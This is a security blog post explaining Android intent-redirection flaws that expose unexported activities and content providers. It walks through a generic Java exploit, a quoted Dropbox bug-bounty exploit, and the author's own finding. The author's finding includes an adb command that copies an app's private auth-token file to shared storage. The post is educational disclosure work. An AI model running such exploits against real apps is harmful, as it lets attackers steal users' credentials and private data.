---
layout: post
title: Gaining access to protected components
date: "2021-06-25"
ShowToc: true
tags:
    - Android
---

In the [previous post](https://blog.mzfr.me/posts/2020-11-07-exported-activities/) I talked about what activities are and how we can exploit exported activities. In this post, I'll show you how an attacker might be able to access the components which are protected i.e `not exported`. And in the end, I'll show you how I found one of the similar bugs on a public bug-bounty program.

## What is this vulnerability?

Basically what happens is that an activity(let's call it `A`) accepts some extras. Those could be simple string([getStringExtra](https://developer.android.com/reference/android/content/Intent#getStringExtra(java.lang.String))) or could be a [`parcerable`](https://developer.android.com/guide/components/activities/parcelables-and-bundles). And without any sort of verification it passes the content of those extra to trigger([`startActivity`](https://developer.android.com/reference/android/app/Activity#startActivity(android.content.Intent))). So `Activity A` ends up starting a new activity which was given by the user via those extras.

This is just like SQLi, where a developer takes a user input and uses that input directly in a query without any kind of sanitization. The only difference is that in SQLi we end up getting data from the DB but in our vulnerability, we are getting access to some of the components of the app that we shouldn't be able to access.

### Example

Let's understand the above theory with an example. Assume there is an app called `SecureApp`. It has an exported activity called `com.secureapp.android.rootactivity`. And below is a sample code

```java
class rootActivity {
....
    public void onCreate(Bundle bundle) {
        ....
        ....
    }

    private void handleIntent(Intent intent) {
        if (intent.hasExtra("secure_extra")) {
            Intent newIntent = intent.getParcerableExtra("secure_extra");
            startActivity(newIntent);
        }
    }
}
....
```

Now in the above `handleIntent` function an intent is passed and code checks if that intent contains a `secure_extra` extra. If it does then it takes the value of that extra(should be parcerable) into a new intent and passes that intent to `startActivity`. There is no verification done, no sanitization just simply trigger the new activity.

The exploit code for above would be something like:

```java
Intent newIntent = new Intent();
// This is we assume there is another activity named com.secureapp.android.WebViewActivity
// And it takes an extra called "url" which it will open in the webview
newIntent.setClassName("com.secureapp.android", ".WebViewActivity");
newIntent.putExtra("url", "http://google.com");

Intent start = new Intent();
start.setClassName("com.secureapp.android", ".rootactivity");
start.putExtra("secure_extra", newIntent);

startActivity(start);
```

This code will trigger `com.secureapp.android.rootactivity` which inturn will trigger `com.secureapp.android.WebViewActivity`. 

To see this vulnerability in the real world, check out [this report](https://hackerone.com/reports/200427) by [@bagipro](https://twitter.com/_bagipro). It shows the same thing.

## Content providers

Now that we know how this vulnerability work and how arbitrary components can be accessed. Let see how we can access data store by the app on the device.

Usually, an app uses content providers to manage all sorts of data on the device. The official Android documentation states that:

> A content provider manages access to a central repository of data. A provider is part of an Android application, which often provides its own UI for working with the data

A very simple example is say in any messenger app you want to attach a file or an image so you click on that attachment icon, you select `Document` and then you see an explorer having a list of all the files(in your devices). You click on one and it gets attached to that message. Well, that's the responsibility of the (one of the) content providers. 

### Accessing content providers

If we have the ability to start arbitrary components and we know there is a category of components responsible for handling data. We can simply access those components to get hold of any/all the data that the app might be having access to. But there is a slight catch, even when we have the ability to access any content providers of the vulnerable app only those will give us data the one which has the `android:grantUriPermissions` flag set to `true`.

#### What does `android:grantUriPermissions` flag does?

From Android dev documentation:

> Whether or not those who ordinarily would not have permission to access the content provider's data can be granted permission to do so, temporarily overcoming the restriction imposed by the readPermission, writePermission, permission, and exported attributes — "true" if permission can be granted, and "false" if not. If "true", permission can be granted to any of the content provider's data. If "false", permission can be granted only to the data subsets listed in <grant-uri-permission> subelements, if any. The default value is "false".

### Example

Again, to understand the above theory properly, see [this report](https://hackerone.com/reports/272044) by [@bagipro](https://twitter.com/_bagipro). The following exploit code was used:

```java
        Intent next = new Intent();
        next.setClassName(getPackageName(), "com.dropbox.android.activity.CameraUploadSettingsActivity");
        next.setData(Uri.parse("content://com.dropbox.android.LocalFile/smth"));
        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);

        Intent intent = new Intent();
        intent.setClassName("com.dropbox.android", "com.dropbox.android.activity.LoginOrNewAcctActivity");
        intent.putExtra("com.dropbox.activity.extra.NEXT_INTENT", next);
        startActivity(intent);
```

Basically the `com.dropbox.android.activity.LoginOrNewAcctActivity` was starting any component given to it in the extra called `com.dropbox.activity.extra.NEXT_INTENT`. So in the exploit a URL to an internal `content` provider is given. Along with 4 another flags.

- `Intent.FLAG_GRANT_READ_URI_PERMISSION` -> Give permission to do read operation on the provider
- `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` -> Give permission to do write operation on provider
- `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` -> Permission to maintain persistent access to the provider.
- `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` -> Access all the data under that provider instead of just acessing singular file/data source.

# A bug I found

So I found a similar bug in an app, let's call it `com.vulnerable.app`. 

Basically this app had only two exported activities:
- `com.vulnerable.app.startActivity`
    - Responsible for starting the app since it was under the `android.intent.category.LAUNCHER` category.
- `com.vulnerable.app.shareactivity`
    - Responsible for sending files or other attachments.

I went through the code of the `startActivity` but didn't notice anything interesting. The `onCreate` function of the app had nothing interesting in it. The same was the case with the `shareactivity`. They had the correct checks in place to stop any malicious app from using the shareactivity to steal any file. But when I was going through the code I noticed a very interesting function.

```java
    private void proceed(long id) {
        Intent intent = new Intent(App.getContext(), startActivity.class);
        intent.setAction("forward_action");
        intent.putExtra("forward_to", <UNEXPORTED_COMPONENT_NAME_HERE>.class.getName());
        intent.putExtra("id", id);
        startActivity(intent);
        finish();
    }
```

You can see that it basically sends a new intent to the `startActivity` with action set to `forward_action` and the name of any component given as an extra in `forward_to` EXTRA. 

This means that we can basically trigger an arbitrary components by doing something like:

```bash
adb shell am start -n com.vulnerable.app/.startActivity -a forward_action --es "forward_action" "name_of_any_exported_component".
```

I tested the above command and it worked(obviously 😏).
So I decided to do what @bagipro does in [this report](https://hackerone.com/reports/272044). But it didn't work because in all the excitement I forgot to check the `android:resource` of that provider. And they didn't allow any root-path and had access to only 1 specific folder. Below is an example of how their `provider_path.xml` file looked like.

```xml
<?xml version="1.0" encoding="utf-8"?>
    <paths>
        <cache-path name="pictures" path="pictures/"/>
    </paths>
```

The exploit might have had a higher impact if the provider path was something like:

```xml
<paths>
    <root-path name="root" path=""/>
    <files-path name="internal_files" path="."/>
</paths>
```

Since the content provider path wasn't worth following I decided to find some other protected components to see if I could trigger something else. And then I found the holy grail of insecure activities. There was a line in the `AndroidManifest.xml`

```xml
<activity android:label="@string/activity_title_explorer" android:name="com.vulnerable.app.Explorer"/>
```

and this activity literally opens a file explorer on the private directory(`/data/data/com.vulnerable.app`) of the app 😂. I seriously couldn't even understand why they had an activity with such functionality because after using ripgrep for more than an hour and trying to find the places that activity was called, I couldn't find anything. 

My best guess is that they had this activity in the dev mode for easy access to the files and then just forgot to remove it (even this reason doesn't make sense). But whatever the reason might be, it was a goldmine for me. I went through the code of the `explorer` activity and saw that it accepted the extras `file` and `to` which literally accepts the path of a file and copies it to the `to` location. So all I had to do was:

```bash
adb shell am start -n com.vulnerable.app/.startActivity -a forward_action --es "forward_to" "com.vulnerable.app.Explorer" --es "file" "/data/data/com.vulnerable.app/sharedprefs/<FILE_STORING_AUTH_TOKEN> --es "to" "/sdcard/Download/"
```

And the internal file would be moved to the external directory from which it can easily be exfiltrated to external servers.

__Update__: After asking why they had such activity in place they told me that some of their clients have "special requests" in which they ask the company to allow them to see what sort of data is stored within the app. 

***

This sort of vulnerability is not very common but can still be seen in various apps.

To read more about this sort of vulnerability read the reports I mentioned above. And also read the following blog posts, they explain everything in more depth and with more technicality.

- https://blog.oversecured.com/Android-Access-to-app-protected-components/
- https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/

***

Thanks for reading, feedback is always appreciated :)
